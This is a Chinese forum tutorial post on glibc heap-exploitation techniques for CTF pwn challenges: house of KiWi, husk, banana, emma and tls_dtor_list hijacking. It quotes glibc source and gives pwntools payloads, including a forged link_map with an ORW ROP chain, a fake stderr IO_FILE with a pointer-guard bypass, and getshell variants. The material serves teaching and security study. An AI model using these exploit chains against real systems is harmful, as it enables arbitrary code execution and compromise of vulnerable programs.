
```
// assert.h
# if defined __cplusplus
#  define assert(expr)                            \
  (static_cast <bool> (expr)                        \
  ? void (0)                            \
  : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))
# elif !defined __GNUC__ || defined __STRICT_ANSI__
#  define assert(expr)                            \
  ((expr)                                \
  ? __ASSERT_VOID_CAST (0)                        \
  : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))
# else
#  define assert(expr)                            \
  ((void) sizeof ((expr) ? 1 : 0), __extension__ ({            \
  if (expr)                                \
  ; /* empty */                            \
  else                                \
  __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION);    \
  }))
# endif

// malloc.c ( #include <assert.h> )
# define __assert_fail(assertion, file, line, function)            \
  __malloc_assert(assertion, file, line, function)

static void __malloc_assert (const char *assertion, const char *file, unsigned int line, const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
  __progname, __progname[0] ? ": " : "",
  file, line,
  function ? function : "", function ? ": " : "",
  assertion);
  fflush (stderr);
  abort ();
}
```

可以看到，在`malloc.c`中，`assert`断言失败，最终都会调用`__malloc_assert`，而其中有一个`fflush (stderr)`的函数调用，会走`stderr`的`IO_FILE`，最终会调用到其`vtable`中`_IO_file_jumps`中的`__IO_file_sync`，此时`rdx`为`IO_helper_jumps`。
开了沙盒需要`orw`的题目，经常使用`setcontext`控制`rsp`，进而跳转过去调用`ROP`链，而在`2.29`版本以上`setcontext`中的参数也由`rdi`变为`rdx`了，起始位置也从`setcontext+53`变为了`setcontext+61`（`2.29`版本有些特殊，仍然是`setcontext+53`起始，但是控制的寄存器已经变成了`rdx`），`rdx`显然没有`rdi`好控制，然而`house of KiWi`恰好能帮助我们控制`rdx`。
下面的问题就在于如何触发`assert`的断言出错，通常有以下几种方式：

1.在`_int_malloc`中判断到`top chunk`的大小太小，无法再进行分配时，会走到`sysmalloc`中的断言：

```
assert ((old_top == initial_top (av) && old_size == 0) ||
  ((unsigned long) (old_size) >= MINSIZE &&
  prev_inuse (old_top) &&
  ((unsigned long) old_end & (pagesize - 1)) == 0));
```

因此，我们可以将`top chunk`的`size`改小，并置`prev_inuse`为`0`，当`top chunk`不足分配时，就会触发这个`assert`了。

2.在`_int_malloc`中，当堆块从`unsorted bin`转入`largebin list`的时候，也会有一些断言：`assert (chunk_main_arena (bck->bk))`，`assert (chunk_main_arena (fwd))`等。

再看相关的宏定义：
`#define NON_MAIN_ARENA 0x4`
`#define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0)`
对`mchunk_size`的解释：`mchunk_size`成员显示的大小并不等价于该`chunk`在内存中的大小，而是当前`chunk`的大小加上`NON_MAIN_ARENA`、`IS_MAPPED`、`PREV_INUSE`位的值。
因此，`assert (chunk_main_arena(...))`就是检测堆块是否来自于`main_arena`，也可以通过伪造即将放入`largebin list`的`largebin's size`来触发`assert`。
对于`house of KiWi`利用，需要存在一个任意写，通过修改`_IO_file_jumps + 0x60`的`_IO_file_sync`指针为`setcontext+61`，并修改`IO_helper_jumps + 0xA0 and 0xA8`分别为`ROP`链的位置和`ret`指令的`gadget`地址即可。

值得一提的是，在`house of KiWi`调用链中，在调用到`__IO_file_sync`之前，在`__vfprintf_internal`中也会调用`IO_FILE`虚表中的函数，会调用`[vtable] + 0x38`的函数，即`_IO_new_file_xsputn`，因此我们可以通过改`IO_FILE`中`vtable`的值，根据偏移来调用其他虚表中的任意函数。

### 高版本下开了沙盒的orw方法

1. 通过`gadget`做到类似于栈迁移的效果，然后走`ROP`链，打`orw`
2. 通过`setcontext + 61`，控制寄存器`rdx`
   （1）可以找`gadget`，使`rdi`或其他寄存器与`rdx`之间进行转换
   （2）通过改`__malloc_hook`为`setcontext + 61`，劫持`IO_FILE`(多是`stdin`)，将`vtable`改成`_IO_str_jumps`的地址，最后通过`exit`，会走到`_IO_str_overflow`函数，其中有`malloc`函数触发`__malloc_hook`，此时的`rdx`就是`_IO_write_ptr`中的值，所以直接使`_IO_write_ptr = SROP_addr`即可。
3. `house of KiWi`
4. 其他`IO`的劫持

对于第一种，`svcudp_reply+26`处有个`gadget`可以实现：

```
<svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
<svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
<svcudp_reply+34>:    lea    r13,[rbp+0x10]
<svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
<svcudp_reply+45>:    mov    rdi,r13
<svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
```

对于第二种，先来看通过`gadget`进行`rdi`与`rdx`间的转换（最常用）：

```
mov rdx, qword ptr [rdi + 8]
mov qword ptr [rsp], rax
call qword ptr [rdx + 0x20]
```

再看通过改`__malloc_hook`并劫持`_IO_FILE`的方法：
为什么说一般劫持的都是`stdin`的`IO_FILE`呢？因为`__malloc_hook`与`stdin`距离是比较近的，可以在劫持`IO_FILE`的同时，就把`__malloc_hook`改掉。
可按如下方式构造`payload`：

```
SROP_addr = libc_base + libc.sym['_IO_2_1_stdin_'] + 0xe0
payload = p64(0)*5 + p64(SROP_addr) # _IO_write_ptr
payload = payload.ljust(0xd8, b'\x00') + p64(libc_base + get_IO_str_jumps_offset())
frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = address
frame.rdx = 0x200
frame.rsp = address + 8
frame.rip = libc_base + libc.sym['read']
payload += bytes(frame)
payload = payload.ljust(0x1f0, b'\x00') + p64(libc_base + libc.sym['setcontext'] + 61) # __malloc_hook
```

至于第三种，`house of KiWi`的方式，在上面已经单独介绍过了，就不再多说了。
关于第四点提到的其他`IO`劫持，在之后都会提及，比如`house of banana`，`house of emma`等等。

### house of husk

在用`printf`进行输出时，会根据其格式化字符串，调用不同的输出函数来以不同格式输出结果。但是如果调用呢？自然是需要格式化字符与其输出函数一一对应的索引表的。`glibc`中的`__register_printf_function`函数是`__register_printf_specifier`函数的封装：

```
int __register_printf_function (int spec, printf_function converter,
  printf_arginfo_function arginfo)
{
  return __register_printf_specifier (spec, converter,
  (printf_arginfo_size_function *) arginfo);
}
```

`__register_printf_specifier`函数就是为格式化字符`spec`的格式化输出注册函数：

```
int __register_printf_specifier (int spec, printf_function converter,
  printf_arginfo_size_function arginfo)
{
  if (spec < 0 || spec > (int) UCHAR_MAX)
  {
    __set_errno (EINVAL);
    return -1;
  }

  int result = 0;
  __libc_lock_lock (lock);

  if (__printf_function_table == NULL)
  {
    __printf_arginfo_table = (printf_arginfo_size_function **)
      calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
    if (__printf_arginfo_table == NULL)
    {
      result = -1;
      goto out;
    }

    __printf_function_table = (printf_function **)
      (__printf_arginfo_table + UCHAR_MAX + 1);
  }

  // 为格式化字符spec注册函数指针
  __printf_function_table[spec] = converter;
  __printf_arginfo_table[spec] = arginfo;

out:
  __libc_lock_unlock (lock);

  return result;
}
```

可以看到，如果格式化字符`spec`超过`0xff`或小于`0`，即`ascii`码不存在，则返回`-1`，如果`__printf_arginfo_table`为空就通过`calloc`分配两张索引表，并将地址存到`__printf_arginfo_table`以及`__printf_function_table`中。两个表空间均为`0x100`，可以为`0-0xff`的每个字符注册一个**函数指针**，且第一个表后面紧接着第二个表。由此，我们有很明显的思路，可以劫持`__printf_arginfo_table`和`__printf_function_table`为我们伪造的堆块（多用`largebin attack`），进而伪造里面格式化字符所对应的函数指针（要么为`0`，要么有效）。
在`vfprintf`函数中，如果检测到`__printf_function_table`不为空，则对于格式化字符不走默认的输出函数，而是调用`printf_positional`函数，进而可以调用到表中的函数指针：

```
// vfprintf-internal.c : 1412
if (__glibc_unlikely (__printf_function_table != NULL
  || __printf_modifier_table != NULL
  || __printf_va_arg_table != NULL))
  goto do_positional;

// vfprintf-internal.c : 1682
do_positional:
  done = printf_positional (s, format, readonly_format, ap, &ap_save,
  done, nspecs_done, lead_str_end, work_buffer,
  save_errno, grouping, thousands_sep, mode_flags);
```

`__printf_function_table`中类型为`printf_function`的函数指针，在`printf->vfprintf->printf_positional`被调用：

```
// vfprintf-internal.c : 1962
if (spec <= UCHAR_MAX
  && __printf_function_table != NULL
  && __printf_function_table[(size_t) spec] != NULL)
{
  const void **ptr = alloca (specs[nspecs_done].ndata_args
  * sizeof (const void *));

  /* Fill in an array of pointers to the argument values. */
  for (unsigned int i = 0; i < specs[nspecs_done].ndata_args;
  ++i)
  ptr[i] = &args_value[specs[nspecs_done].data_arg + i];

  /* Call the function. */
  function_done = __printf_function_table[(size_t) spec](s, &specs[nspecs_done].info, ptr);
  // 调用__printf_function_table中的函数指针

  if (function_done != -2)
  {
  /* If an error occurred we don't have information about # of chars.  */
  if (function_done < 0)
  {
  /* Function has set errno. */
  done = -1;
  goto all_done;
  }

  done_add (function_done);
  break;
  }
}
```

另一个在`__printf_arginfo_table`中的类型为`printf_arginfo_size_function`的函数指针，在`printf->vfprintf->printf_positional->__parse_one_specmb`中被调用，其功能是根据格式化字符做解析，返回值为格式化字符消耗的参数个数：

```
// vfprintf-internal.c : 1763
nargs += __parse_one_specmb (f, nargs, &specs[nspecs], &max_ref_arg);

// printf-parsemb.c (__parse_one_specmb函数)
/* Get the format specification. */
spec->info.spec = (wchar_t) *format++;
spec->size = -1;
if (__builtin_expect (__printf_function_table == NULL, 1)
  || spec->info.spec > UCHAR_MAX
  || __printf_arginfo_table[spec->info.spec] == NULL // 判断是否为空
  /* We don't try to get the types for all arguments if the format
  uses more than one.  The normal case is covered though.  If
  the call returns -1 we continue with the normal specifiers. */
  || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec]) // 调用__printf_arginfo_table中的函数指针
  (&spec->info, 1, &spec->data_arg_type,
  &spec->size)) < 0)
  {
  /* Find the data argument types of a built-in spec. */
  spec->ndata_args = 1;
```

可以看到，是先调用了`__printf_arginfo_table`中的函数指针，再调用了`__printf_function_table`中的函数指针。
假设现在`__printf_function_table`和`__printf_arginfo_table`分别被填上了`chunk 4`与`chunk 8`的堆块地址（`chunk header`）。
方式一：

```
one_gadget = libc.address + 0xe6c7e
edit(8, p64(0)*(ord('s') - 2) + p64(one_gadget))
```

由于有堆块头，所以格式化字符的索引要减`2`，这样写就满足了`__printf_function_table`不为空，进入了`printf_positional`函数，并调用了`__printf_arginfo_table`中的函数指针。
方式二：

```
one_gadget = libc.address + 0xe6ed8
edit(4, p64(0)*(ord('s') - 2) + p64(one_gadget))
```

这样写同样也是可以的，首先仍然满足`__printf_function_table`不为空，进入了`printf_positional`函数，会先进入`__parse_one_specmb`，此时`__printf_arginfo_table[spec->info.spec] == NULL`成立，那么根据逻辑短路，就不会再执行下面的语句了，最后又回到`printf_positional`函数，调用了`__printf_function_table`中的函数指针。

### house of banana

其实就是劫持了`link_map`，需要`exit`函数触发，调用链：`exit()->_dl_fini->(fini_t)array[i]`，可以很方便地`getshell`或者在高版本下`orw`。
先看`Elf64_Dyn`结构体定义（注意里面有一个共用体）：

```
typedef struct
{
  Elf64_Sxword    d_tag; /* Dynamic entry type */
  union
  {
    Elf64_Xword d_val; /* Integer value */
    Elf64_Addr d_ptr; /* Address value */
  } d_un;
} Elf64_Dyn;

// link_map中l_info的定义
ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
  + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
```

再看`_dl_fini.c`中的这一段：

```
for (i = 0; i < nmaps; ++i)
{
  struct link_map *l = maps[i]; // link_map结构体指针l
  if (l->l_init_called)
  {
    /* Make sure nothing happens if we are called twice. */
    l->l_init_called = 0;

    /* Is there a destructor function? */
    if (l->l_info[DT_FINI_ARRAY] != NULL
      || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
    {
      .............
      /* First see whether an array is given. */
      if (l->l_info[DT_FINI_ARRAY] != NULL)
      {
        ElfW(Addr) *array =
          (ElfW(Addr) *) (l->l_addr
          + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
        unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
          / sizeof (ElfW(Addr)));
        while (i-- > 0)
          ((fini_t) array[i]) (); // 调用了函数指针
      }
      ...
    }
    ...
  }
  ...
}
```

这里面涉及的结构体比较多，成员参数也比较复杂。可以看到源码中`l`指针的类型为`link_map`结构体。`link_map`结构体的定义很长，节选如下：

```
struct link_map
{
  ElfW(Addr) l_addr; /* Difference between the address in the ELF
  file and the addresses in memory. */
  char *l_name; /* Absolute file name object was found in. */
  ElfW(Dyn) *l_ld; /* Dynamic section of the shared object. */
  struct link_map *l_next, *l_prev; /* Chain of loaded objects. */

  /* All following members are internal to the dynamic linker.
  They may change without notice. */

  /* This is an element which is only ever different from a pointer to
  the very same copy of this type for ld.so when it is used in more
  than one namespace. */
  struct link_map *l_real;
  ......
};
```

可以看到，`link_map`和堆块链表一样，是通过`l_next`与`l_prev`指针连接起来的，那么肯定就有一个类似于`main_arena`或者说是`tcache struct`的地方，存放着这个链表头部指针的信息，这个地方就是`_rtld_global`结构体：

```
pwndbg> p _rtld_global
$1 = {
  _dl_ns = {{
    _ns_loaded = 0x7ffff7ffe190,
    _ns_nloaded = 4,
    ......
```

这里的`_ns_loaded`就是`link_map`链表头部指针的地址，`_ns_nloaded = 4`说明这个`link_map`链表有四个`link_map`结构体，它们通过`l_next`与`l_prev`指针连接在一起。
我们再用`gdb`打出`link_map`的头部结构体的内容：

```
pwndbg> p *(struct link_map *) 0x7ffff7ffe190
$2 = {
  l_addr = 93824990838784,
  l_name = 0x7ffff7ffe730 "",
  l_ld = 0x555555601d90,
  l_next = 0x7ffff7ffe740,
  l_prev = 0x0,
  l_real = 0x7ffff7ffe190,
  ......
```

很自然，在`house of banana`的利用中，我们需要劫持`_rtld_global`的首地址，也就是`_ns_loaded`，将它通过`largebin attack`等方式改写为我们可控的堆地址，然后再对`link_map`进行伪造（当然，对于有些题目，有办法直接劫持到原先的`link_map`并修改，那更好）。
伪造`link_map`的时候，首先就需要注意几个地方：将`l_next`需要还原，这样之后的`link_map`就不需要我们再重新伪造了；将`l_real`设置为自己伪造的`link_map`堆块地址，这样才能绕过检查。
之后，我们再回到`_dl_fini.c`中的源码，看看如何利用`house of banana`进行攻击。
首先，再最外层判断中，需要使`l->l_init_called`为真，因此需要对`l_init_called`进行一个伪造。
然后，需要使`l->l_info[DT_FINI_ARRAY] != NULL`，才能调用函数指针，这里有`#define DT_FINI_ARRAY 26`，也就是使得`l->l_info[26]`不为空。
再之后就是`array = (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);`，这里需要伪造`link_map`中的`l_addr`（这里在已经伪造的`link_map`的堆块头，需要通过其上一个堆块溢出或是合并后重分配进行修改），以及`l->l_info[26]->d_un.d_ptr`，也就是`l->l_info[27]`，使其相加的结果为函数指针的基地址。
调用函数指针的次数`i`由`i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)))`控制，其中`#define DT_FINI_ARRAYSZ 28`，`sizeof (ElfW(Addr)) = 8`，因此`i = l->l_info[29] / 8`。
这里每次调用的函数指针都为上一个的地址减`8`，直到最后调用函数指针的基地址`array`，而每一次调用函数指针，其`rdx`均为上一次调用的函数指针的地址，由此我们可以轻松地通过`setcontext + 61`布置`SROP`，跳转执行`ROP`链。
构造代码如下：

```
fake_link_map_addr = heap_base + 0x6c0
edit(0, b'a'*0x420 + p64(fake_link_map_addr + 0x20)) # l_addr
payload = p64(0) + \
  p64(ld.address + 0x2f740) # l_next
payload += p64(0) + p64(fake_link_map_addr) # l_real
payload += p64(libc.sym['setcontext'] + 61) # second call  rdx = the address of last call
payload += p64(ret_addr) # first call (fake_link_map_addr + 0x38)

'''
# getshell
payload += p64(pop_rdi_ret) # 0x40
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
'''

# orw
flag_addr = fake_link_map_addr + 0xe8
payload += p64(pop_rdi_ret) + p64(flag_addr) # fake_link_map_addr + 0x40
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(2)
payload += p64(libc.sym['syscall'] + 27)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(fake_link_map_addr + 0x200)
payload += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
payload += p64(libc.sym['read'])
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(libc.sym['write']) # fake_link_map_addr + 0xc8
payload += p64(libc.sym['_exit'])

payload = payload.ljust(0x38 - 0x10 + 0xa0, b'\x00') # => fake_link_map_addr + 0xd8  SROP
payload += p64(fake_link_map_addr + 0x40) # rsp
payload += p64(ret_addr) # rip
payload += b'./flag\x00\x00' # fake_link_map_addr + 0xe8

payload = payload.ljust(0x100, b'\x00')
# l->l_info[DT_FINI_ARRAY] != NULL => l->l_info[26] != NULL
payload += p64(fake_link_map_addr + 0x110) + p64(0x10) # l->l_info[26]  &  d_ptr = 0x10
payload += p64(fake_link_map_addr + 0x120) + p64(0x10) # l->l_info[28]  &  i = 0x10/8 = 2 => array[1] = l->l_addr + d_ptr + 8 => array[0] = l->l_addr + d_ptr
payload = payload.ljust(0x308, b'\x00')
payload += p64(0x800000000) # l->l_init_called
```

### 劫持tls\_dtor\_list，利用\_\_call\_tls\_dtors拿到权限

这个利用也是通过`exit`触发的，和`house of banana`实现的效果差不多，利用流程比`house of banana`简单，但是主要是用于`getshell`，在开了沙盒后，`orw`并没有`house of banana`方便。
首先来看`dtor_list`结构体的定义：

```
struct dtor_list
{
  dtor_func func;
  void *obj;
  struct link_map *map;
  struct dtor_list *next;
};

static __thread struct dtor_list *tls_dtor_list;
```

可以看到，`tls_dtor_list`就是`dtor_list`的结构体指针，里面存放着一个`dtor_list`结构体的地址。
再看到`__call_tls_dtors`函数（对`tls_dtor_list`进行遍历）：

```
void __call_tls_dtors (void)
{
  while (tls_dtor_list)
  {
    struct dtor_list *cur = tls_dtor_list;
    dtor_func func = cur->func;
#ifdef PTR_DEMANGLE
    PTR_DEMANGLE (func);
#endif

    tls_dtor_list = tls_dtor_list->next;
    func (cur->obj);

    atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
    free (cur);
  }
}
```

由此可知，`dtor_list`结构体中的`func`成员，其实是一个函数指针，而其中的`obj`成员就是其调用时的参数。
很显然，若我们可以劫持`tls_dtor_list`，在其中写入我们伪造的堆地址，使其不为空（绕过`while (tls_dtor_list)`），就能执行到`func (cur->obj)`，而我们又可以控制伪造的堆块中`prev_size`域为`system`的相关数据（由于有指针保护，之后会讲），`size`域为`/bin/sh`的地址（通过上一个堆块的溢出或合并后重分配），这样就能`getshell`了，若是想`orw`，那么可以让`func`成员为`magic_gadget`的相关数据，将`rdi`与`rdx`转换后，再调用`setcontext + 61`走`SROP`即可。
需要注意的是，在调用`func`函数指针之前，对`func`执行了`PTR_DEMANGLE (func)`，这是一个指针保护，我们可以通过`gdb`直接看到其汇编：

```
ror    rax,0x11
xor    rax,QWORD PTR fs:0x30
mov    QWORD PTR fs:[rbx],rdx
mov    rdi,QWORD PTR [rbp+0x8]
call   rax
```

这操作主要是先进行**循环右移**`0x11`位，再与`fs:0x30（tcbhead_t->pointer_guard）`进行**异或**，最终得到的数据就是我们的函数指针，并调用。
因此，我们在之前所说的将`func`成员改成的与`system`相关的数据，就是对指针保护进行一个逆操作：先将`system_addr`与`pointer_guard`进行异或，再将结果循环左移`0x11`位后，填入`prev_size`域。
然而，`pointer_guard`的值在`TLS`结构中（在`canary`保护`stack_guard`的下一个），我们很难直接得到它的值，但是我们可以通过一些攻击手段，往其中写入我们可控数据，这样就可以控制`pointer_guard`，进而绕过指针保护了。

```
ROL = lambda val, r_bits, max_bits: \
  (val << r_bits%max_bits) & (2**max_bits-1) | \
  ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# 两次largebin attack改tls_dtor_list与pointer_guard

fake_pointer_guard = heap_base + 0x17b0
edit(0, b'a'*0x420 + p64(ROL(libc.sym['system'] ^ fake_pointer_guard, 0x11, 64)) + p64(next(libc.search(b'/bin/sh'))))
```

### house of emma

主要是针对于`glibc 2.34`中删除了`__free_hook`与`__malloc_hook`等之前经常利用的函数指针而提出的一条新的调用链。
`house of emma`利用了`_IO_cookie_jumps`这个`vtable`：

```
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_cookie_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf),
  JUMP_INIT(sync, _IO_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_cookie_read),
  JUMP_INIT(write, _IO_cookie_write),
  JUMP_INIT(seek, _IO_cookie_seek),
  JUMP_INIT(close, _IO_cookie_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue),
};
```

可以考虑其中的这几个函数：

```
static ssize_t _IO_cookie_read (FILE *fp, void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_read_function_t *read_cb = cfile->__io_functions.read;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (read_cb);
#endif

  if (read_cb == NULL)
    return -1;

  return read_cb (cfile->__cookie, buf, size);
}

static ssize_t _IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_write_function_t *write_cb = cfile->__io_functions.write;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (write_cb);
#endif

  if (write_cb == NULL)
  {
    fp->_flags |= _IO_ERR_SEEN;
    return 0;
  }

  ssize_t n = write_cb (cfile->__cookie, buf, size);
  if (n < size)
    fp->_flags |= _IO_ERR_SEEN;

  return n;
}

static off64_t _IO_cookie_seek (FILE *fp, off64_t offset, int dir)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (seek_cb);
#endif

  return ((seek_cb == NULL
    || (seek_cb (cfile->__cookie, &offset, dir) == -1)
    || offset == (off64_t) -1)
    ? _IO_pos_BAD : offset);
}

static int _IO_cookie_close (FILE *fp)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (close_cb);
#endif

  if (close_cb == NULL)
    return 0;

  return close_cb (cfile->__cookie);
}
```

其中涉及到的结构体定义：

```
struct _IO_cookie_file
{
  struct _IO_FILE_plus __fp;
  void *__cookie;
  cookie_io_functions_t __io_functions;
};

typedef struct _IO_cookie_io_functions_t
{
  cookie_read_function_t *read; /* Read bytes. */
  cookie_write_function_t *write; /* Write bytes. */
  cookie_seek_function_t *seek; /* Seek/tell file position. */
  cookie_close_function_t *close; /* Close file. */
} cookie_io_functions_t;
```

在这几个函数里，都有函数指针的调用，且这几个函数指针都在劫持的`IO_FILE`偏移的不远处，用同一个堆块控制起来就很方便，不过在任意调用之前也都需要绕过指针保护`PTR_DEMANGLE`。此外，在调用函数指针的时候，其`rdi`都是`cfile->__cookie`，控制起来也是非常方便的。
利用`house of KiWi`配合`house of emma`的调用链为`__malloc_assert -> __fxprintf -> __vfxprintf -> locked_vfxprintf -> __vfprintf_internal -> _IO_new_file_xsputn ( => _IO_cookie_write)`，这里用的是`_IO_cookie_write`函数，用其他的当然也同理。
伪造的`IO_FILE`如下：

```
ROL = lambda val, r_bits, max_bits: \
  (val << r_bits%max_bits) & (2**max_bits-1) | \
  ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

magic_gadget = libc.address + 0x1460e0 # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]

fake_stderr = p64(0)*3
fake_stderr += p64(0xffffffffffffffff)
fake_stderr = fake_stderr.ljust(0x78, b'\x00')
fake_stderr += p64(libc.sym['_IO_stdfile_2_lock']) # _lock
# _IO_flockfile(fp) in __vfxprintf
fake_stderr = fake_stderr.ljust(0xc8, b'\x00')
fake_stderr += p64(libc.sym['_IO_cookie_jumps'] + 0x40) # fake_vtable
# call [vtable]+0x38 (call _IO_new_file_xsputn)
# => call _IO_cookie_jumps+0x78 => call _IO_cookie_write
fake_stderr += p64(srop_address) # __cookie (rdi)
fake_stderr += p64(0)
fake_stderr += p64(ROL(magic_gadget ^ __pointer_chk_guard, 0x11, 64)) # __io_functions.write
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2022-9-4 13:19
被winmt编辑
，原因：

[#基础知识](https://bbs.kanxue.com/forum-171-1-180.htm)
[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)
[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)
